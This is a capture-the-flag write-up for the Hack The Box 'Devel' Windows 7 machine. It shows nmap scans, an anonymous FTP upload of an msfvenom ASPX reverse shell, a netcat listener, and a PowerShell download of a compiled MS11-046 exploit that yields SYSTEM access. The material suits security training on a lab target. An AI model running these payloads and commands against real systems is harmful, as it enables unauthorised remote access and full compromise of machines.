# Devel

[Devel](https://app.hackthebox.com/machines/Devel) is a Windows based challenge and it pretty easy. It focuses on specific privilege escalation vulnerability in a specific version of Windows 7.

So, let's get started.

## Enumeration

To determine all the services that are running on this machine we can start an `nmap` scan against it.

```
┌──(kali㉿kali)-[~/Desktop/htb/devel]
└─$ sudo nmap -p- -sS -T4 -oG open_ports 10.10.10.5    
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-21 03:56 EDT
Nmap scan report for 10.10.10.5
Host is up (0.092s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE
21/tcp open  ftp
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 129.81 seconds
```

It can be seen that only 2 ports are open and we can run an in-depth scan against them to check if `nmap` can detect any vulnerabilities associated with them.

```
┌──(kali㉿kali)-[~/Desktop/htb/devel]
└─$ sudo nmap -p21,80 -sC -sV -oG port_details 10.10.10.5
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-21 04:09 EDT
Nmap scan report for 10.10.10.5
Host is up (0.089s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  02:06AM       <DIR>          aspnet_client
| 03-17-17  05:37PM                  689 iisstart.htm
|_03-17-17  05:37PM               184946 welcome.png
80/tcp open  http    Microsoft IIS httpd 7.5
|_http-title: IIS7
|_http-server-header: Microsoft-IIS/7.5
| http-methods: 
|_  Potentially risky methods: TRACE
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.15 seconds
```

It looks like we can access FTP anonymously. So, we can check it out first.

```
┌──(kali㉿kali)-[~/Desktop/htb/devel]
└─$ ftp 10.10.10.5                                                                                 
Connected to 10.10.10.5.
220 Microsoft FTP Service
Name (10.10.10.5:kali): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
229 Entering Extended Passive Mode (|||49158|)
125 Data connection already open; Transfer starting.
03-18-17  02:06AM       <DIR>          aspnet_client
03-17-17  05:37PM                  689 iisstart.htm
03-17-17  05:37PM               184946 welcome.png
```

It looks like the data stored in the FTP server is being used to host the IIS based webpage. Apart from that nothing useful can be found in the FTP service.

When we access the IP address via browser we can see the same `welcome.png` being hosted which confirms our suspicion.

![image-20220821094754797](E:\GitHub\Writeups\HackTheBox\Easy\devel\.images\image-20220821094754797.png)

This gives a clear hint that we can try to upload a malicious page from the FTP server and then invoke it by sending a request via our browser and then get a reverse shell. 

## Gaining Foothold

The first thing that we need is an ASPX based payload that we can upload on the FTP server and we can use `msfvenom` for that.

```
┌──(kali㉿kali)-[~/Desktop/htb/devel]
└─$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.4 LPORT=1337 -f aspx > shell.aspx 
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of aspx file: 2725 bytes
```

Once the payload is generated, the next task is to upload it.

```
┌──(kali㉿kali)-[~/Desktop/htb/devel]
└─$ ftp 10.10.10.5
Connected to 10.10.10.5.
220 Microsoft FTP Service
Name (10.10.10.5:kali): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> put shell.aspx
local: shell.aspx remote: shell.aspx
229 Entering Extended Passive Mode (|||49170|)
125 Data connection already open; Transfer starting.
100% |************************************************************************|  2760       11.54 MiB/s    --:-- ETA
226 Transfer complete.
2760 bytes sent in 00:00 (10.74 KiB/s)
ftp> ls
229 Entering Extended Passive Mode (|||49171|)
125 Data connection already open; Transfer starting.
03-18-17  02:06AM       <DIR>          aspnet_client
03-17-17  05:37PM                  689 iisstart.htm
08-21-22  11:17AM                 2760 shell.aspx
03-17-17  05:37PM               184946 welcome.png
226 Transfer complete.
ftp> exit
```

Now, all we need to do is start a listener on port 1337 and try to access `http://10.10.10.5/shell.aspx` from our browser to get our reverse shell.

```
┌──(kali㉿kali)-[~/Desktop/htb/devel]
└─$ nc -nlvp 1337
listening on [any] 1337 ...
connect to [10.10.16.4] from (UNKNOWN) [10.10.10.5] 49180
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

c:\windows\system32\inetsrv>whoami
whoami
iis apppool\web
```

So, it looks like we got access as `iis apppool\web` but still we can't access the user flag. 

```
c:\windows\system32\inetsrv>cd c:\Users
cd c:\Users

c:\Users>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 137F-3971

 Directory of c:\Users

18/03/2017  02:16 ��    <DIR>          .
18/03/2017  02:16 ��    <DIR>          ..
18/03/2017  02:16 ��    <DIR>          Administrator
17/03/2017  05:17 ��    <DIR>          babis
18/03/2017  02:06 ��    <DIR>          Classic .NET AppPool
14/07/2009  10:20 ��    <DIR>          Public
               0 File(s)              0 bytes
               6 Dir(s)   4.563.058.688 bytes free

c:\Users>cd babis
cd babis
Access is denied.
```

This probably means either we need to escalate our privileges to SYSTEM or the user level.

## Privilege Escalation

To get started with PrivEsc, the first thing that we can look at would be the OS version running on this machine and if there are any exploits available for the same.

```
c:\Users>systeminfo
systeminfo

Host Name:                 DEVEL
OS Name:                   Microsoft Windows 7 Enterprise 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          babis
Registered Organization:   
Product ID:                55041-051-0948536-86302
Original Install Date:     17/3/2017, 4:17:31 ��
System Boot Time:          21/8/2022, 10:55:08 ��
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               X86-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: x64 Family 6 Model 85 Stepping 7 GenuineIntel ~2294 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     3.071 MB
Available Physical Memory: 2.470 MB
Virtual Memory: Max Size:  6.141 MB
Virtual Memory: Available: 5.552 MB
Virtual Memory: In Use:    589 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: vmxnet3 Ethernet Adapter
                                 Connection Name: Local Area Connection 3
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.5
                                 [02]: fe80::58c0:f1cf:abc6:bb9e
                                 [03]: dead:beef::6886:27d2:8870:4199
                                 [04]: dead:beef::58c0:f1cf:abc6:bb9e
```

Here, it can be seen that the system is running on Windows 7 version 6.1.7600. So, we can look for exploits related to this particular windows version.

From a quick google search, the first exploit that pops up is [MS11-046](https://www.exploit-db.com/exploits/40564) with which we can perform a local privilege escalation. We can get the exploit from `searchsploit` and then all we need to do is compile it and send it to the target machine.

```
┌──(kali㉿kali)-[~/Desktop/htb/devel]
└─$ searchsploit -m 40564
  Exploit: Microsoft Windows (x86) - 'afd.sys' Local Privilege Escalation (MS11-046)
      URL: https://www.exploit-db.com/exploits/40564
     Path: /usr/share/exploitdb/exploits/windows_x86/local/40564.c
File Type: C source, ASCII text

Copied to: /home/kali/Desktop/htb/devel/40564.c
```

The compilation instructions are given in the exploit itself but we need `i686-w64-mingw32-gcc` to compile it. 

This can be downloaded using the command `sudo apt install gcc-mingw-w64-i686` and then we can compile the code as

```
┌──(kali㉿kali)-[~/Desktop/htb/devel]
└─$ i686-w64-mingw32-gcc 40564.c -o exploit.exe -lws2_32
```

To send it over to the target machine, we have 2 ways:

1. Send it via already accessible FTP.
2. Fetch file via PowerShell command.

I tried the FTP option but for some reason the file becomes non-executable and given the following error

```
c:\Users\Public\Downloads>exploit.exe
exploit.exe
This program cannot be run in DOS mode.
```

I tried to run it from different directories but got the same error.

The next option that we can use is start a python server on our local machine with the command `python3 -m http.server` and then use the following PowerShell command to fetch it from the target machine.

```powershell
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.16.4:8000/exploit.exe', 'c:\Users\Public\Downloads\exploit.exe')"
```

*Make sure to download it in Public directory because user "iis apppool/web" might not have access to other directories.*

Once the file is fetched all we need to do it run it to get SYSTEM level access.

```
c:\Users\Public\Downloads>exploit.exe
exploit.exe

c:\Windows\System32>whoami
whoami
nt authority\system
```

As we got access as "nt authority\system" we can read both the user and root flags easily.

## Key Points to Take Away

1. When creating `msfvenom` payloads, test both x86 and x64 payloads.
2. If you get an error that program can't be executed, try to upload it via some other means (using python server with powershell/wget is the best way)

## References

1. [Devel](https://app.hackthebox.com/machines/Devel)
2. [MS11-046](https://www.exploit-db.com/exploits/40564)